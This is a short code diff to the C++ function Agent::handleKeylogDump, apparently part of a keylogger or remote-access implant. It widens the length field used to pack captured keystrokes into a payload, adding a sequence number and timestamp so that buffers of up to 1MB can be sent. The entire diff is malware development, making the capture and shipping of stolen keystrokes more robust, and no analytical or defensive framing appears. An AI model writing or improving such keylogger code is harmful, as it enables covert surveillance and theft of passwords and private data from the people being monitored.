@@ -164,21 +164,26 @@ void Agent::handleKeylogDump() {
     seq_num++;
     
     uint32_t timestamp = static_cast<uint32_t>(std::time(nullptr));
-    uint16_t data_len = static_cast<uint16_t>(keystrokes.size());
+    uint32_t data_len  = static_cast<uint32_t>(keystrokes.size());
     
     std::vector<uint8_t> payload;
-    payload.reserve(10 + data_len);
+    payload.reserve(12 + data_len);
     
+    // Sequence Number (4 bytes)
     payload.push_back((seq_num >> 24) & 0xFF);
     payload.push_back((seq_num >> 16) & 0xFF);
     payload.push_back((seq_num >> 8) & 0xFF);
     payload.push_back(seq_num & 0xFF);
     
+    // Timestamp (4 bytes)
     payload.push_back((timestamp >> 24) & 0xFF);
     payload.push_back((timestamp >> 16) & 0xFF);
     payload.push_back((timestamp >> 8) & 0xFF);
     payload.push_back(timestamp & 0xFF);
     
+    // Data Length (4 bytes) - Expanded from 2 bytes to handle 1MB buffer
+    payload.push_back((data_len >> 24) & 0xFF);
+    payload.push_back((data_len >> 16) & 0xFF);
     payload.push_back((data_len >> 8) & 0xFF);
     payload.push_back(data_len & 0xFF);
     
